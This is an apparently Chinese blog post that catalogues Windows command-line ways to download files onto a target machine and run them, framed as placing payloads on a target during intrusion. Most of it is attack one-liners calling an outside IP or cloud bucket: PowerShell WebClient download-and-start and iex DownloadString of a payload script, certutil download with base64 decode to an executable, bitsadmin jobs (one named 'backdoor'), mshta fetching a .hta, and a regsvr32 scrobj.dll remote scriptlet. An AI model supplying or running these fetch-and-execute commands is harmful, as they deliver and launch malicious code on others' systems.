---
layout: post
title: 命令行文件下载-Windows篇(长期更新)
---

> *文章长期更新，此文收集总结了Windows下 下载文件的各种姿势，对目标表进行文件的落地（或无落地）*

---

[TOC]

# 0x01 PoweShell

`win2003，winXP`不支持

踩坑

- Powershell 版本大于`2.0`时 在连接两个命令时 用 **空格** 替换了 `;`
- Powershell 等于`2.0`时 `DownloadFile()`函数不支持自定义保存路径 文件默认保存在`C:\Users\当前用户名` 下![image-20200403122054016](https://tva1.sinaimg.cn/large/00831rSTly1gdggmdhh09j311w0ecdit.jpg)![image-20200403121710725](https://tva1.sinaimg.cn/large/00831rSTly1gdggiiv0ndj30mo0f040i.jpg)



不指定保存路径兼容性更高


```powershell
powershell (new-object System.Net.WebClient).DownloadFile('http://47.92.194.173/test.txt', '1.bat');start-process '1.bat'
```

指定路径（Windows7以上适用）

```powershell
powershell (new-object System.Net.WebClient).DownloadFile('http://47.92.194.173/test.txt', '%temp%\1.bat');start-process '%temp%\1.bat'
```

`%temp%`指当前登陆用户的临时目录

powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('https://ottoknown.oss-cn-qingdao.aliyuncs.com/payload.ps1')"

TYPE payload.ps1 | PowerShell -noprofile -

---

# 0x02 Certutil

Path

- C:\Windows\System32\certutil.exe
- C:\Windows\SysWOW64\certutil.exe

踩坑

- 低版本certutil不支持指定下载的目录，为了兼容性可以直接在当前目录操作

```php
certutil -urlcache -split -f http://47.92.194.173/test.txt&ren 1.txt 1.bat&1.bat
或者
certutil -urlcache -split -f http://47.92.194.173/test.txt %temp%\1.bat&%temp%\1.bat
```

Certutil也支持base64加解密以及16进制解密

![image-20200403165312327](https://tva1.sinaimg.cn/large/00831rSTly1gdgohpx2oaj30lu052wfb.jpg)

```php
certutil -urlcache -split -f http://47.92.194.173/test.bs4 %temp%\1.bs4&certutil -decode %temp%\1.bs4 %temp%\1.exe&%temp%\1.exe
```

---

# 0x03 bitsadmin

Path:

- C:\Windows\System32\bitsadmin.exe
- C:\Windows\SysWOW64\bitsadmin.exe

踩坑：

- 在Windows7或某些版本的Windows10上会运行失败 出现以下报错

  > BITSAdmin is deprecated and is not guaranteed to be available in future versions
  >  of Windows.
  >
  > BITSAdmin已弃用，并且不能保证在将来的Windows版本中可用。
  >
  > Administrative tools for the BITS service are now provided by BITS PowerShell cm
  > dlets.
  >
  > BITS PowerShell cmdlet现在提供了BITS服务的管理工具

  



```python
bitsadmin /transfer n http://github.com/3gstudent/test/raw/master/putty.exe c:\a.exe && c:\a.exe

bitsadmin /create 1 bitsadmin /addfile 1 http://47.92.194.173/test.txt c:\autoruns.bat bitsadmin /RESUME 1 bitsadmin /complete 1

bitsadmin /create 1 bitsadmin /addfile 1 http://47.92.194.173/test.txt C:\Program Files (x86)\1.bat bitsadmin /RESUME 1 bitsadmin /complete 1



bitsadmin /rawreturn /transfer getfile http://47.92.194.173/test.txt C:\Program Files\1.bat



bitsadmin /transfer myDownLoadJob /download /priority normal "http://47.92.194.173/test.txt" "C:\Program Files (x86)\1.bat"

bitsadmin /transfer backdoor http://47.92.194.173/test.txt C:\Program Files\1.bat

DISPLAY: '任务名' TYPE: DOWNLOAD STATE: TRANSFERRED PRIORITY: NORMAL FILES: 1 / 1 BYTES: 11392 / 11392 (100%) Transfer complete

默认情况下bitsadmin下载速度极慢，下载较大文件需要设置优先级提速，以下是用法示例：

\#下载filezilla FTP客户端，任务名是333 start bitsadmin /transfer 333 http://dwz.cn/fffftp c:\333.exe #设置任务333为最高优先级 bitsadmin /setpriority 333 foreground

bitsadmin 可以在网络不稳定的状态下下载文件，出错会自动重试，可靠性应该相当不错。
bitsadmin 可以跟随URL跳转.
bitsadmin 不像CURL WGET 这类工具那样能用来下载HTML页面。

bitsadmin 权限问题待解决

bitsadmin已经在win7 win10 win2008 不可用


```

---

# 0x04 mshta

mshta http://47.92.194.173/hack.hta 支持短网址

http://suo.im/5VA0Ut





regsvr32 /u /s /i:http://47.92.194.173/test1.sct scrobj.dll